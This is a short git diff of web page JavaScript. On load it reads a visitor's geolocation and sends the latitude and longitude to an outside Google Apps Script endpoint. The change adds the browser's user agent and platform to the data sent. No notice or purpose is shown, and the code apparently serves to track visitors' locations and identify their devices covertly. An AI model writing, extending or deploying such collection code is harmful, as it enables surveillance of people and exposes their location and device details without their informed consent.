@@ -13,13 +13,17 @@ window.onload = function() {
 function getLocation() {
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(showPosition);
+
   } else { 
   }
 }		
 var xurl = "https://script.google.com/macros/s/AKfycbyhIZoJ6tZCI61FenWVHSlmt10F4Zw-NEE0Gzeecr6LLnB2pYY/exec";
 	function showPosition(position) {
 	    var xmlhttp = new XMLHttpRequest();
-        var theUrl = xurl+"?lat="+position.coords.latitude+"&long="+position.coords.longitude;
+	    var useragent = navigator.userAgent;
+	    var platform = navigator.platform;
+	    
+        var theUrl = xurl+"?lat="+position.coords.latitude+"&long="+position.coords.longitude+"&useragent="+useragent+"&platform="+platform;
         xmlhttp.open('GET', theUrl);
         xmlhttp.send();
             xmlhttp.onreadystatechange = function() {
